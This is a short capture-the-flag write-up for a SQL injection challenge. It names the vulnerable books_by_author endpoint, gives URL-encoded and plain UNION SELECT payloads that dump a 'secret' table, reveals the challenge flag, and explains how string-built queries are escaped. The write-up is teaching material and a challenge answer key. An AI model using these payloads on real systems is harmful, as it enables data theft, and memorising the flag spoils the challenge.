## Solution
- Background on databases: https://www.guru99.com/introduction-to-database-sql.html
- SQL (strucuted query langauge) is how to get/alter information in the database. 
- This challenge is suspectable to SQL injection (SQLi). This abuses the fact that query are run dynamically created then quiered. 
- One of the most common vulns to find in the wild! This can be used in order to steal data, alter data or much worse!
- Explainations can be seen below...


## Exploit 
- http://IP:5000/books_by_author?name="something". This is the vulernable API endpoint 
- Make a get request with the following parameter value: 
	- %27%20UNION%20SELECT%20*%20FROM%20secret;%20-- 
	- This actually looks like "' UNION SELECT * FROM secret; -- "
	- Or, "' UNION SELECT * FROM secret WHERE '1' OR '1"
- Flag: flg{SQLi_1s_fUn}
	
## How Does this Work? 
- The query is just a string. Because of this, if values are just being added to the SQL query (such as parameters) then the QUERY ITSELF can be altered. 
- SELECT b.title
  FROM author as a, books as b
  WHERE a.author_id = b.author_id AND a.name = '%s'
- Now, instead of the '%s' as a filler, let us insert a new string, such as ' OR 1=1 -- 
	- SELECT b.title
	  FROM author as a, books as b
      WHERE a.author_id = b.author_id AND a.name = '' OR 1=1 -- 
	- The query itself has been altered! With the single quote, we have escaped the string that was being used to encapsulate the input parameter. 
	- Then, in order to get the value that we want, we use a UNION (which concatanates the results of two queries). 
	
	
	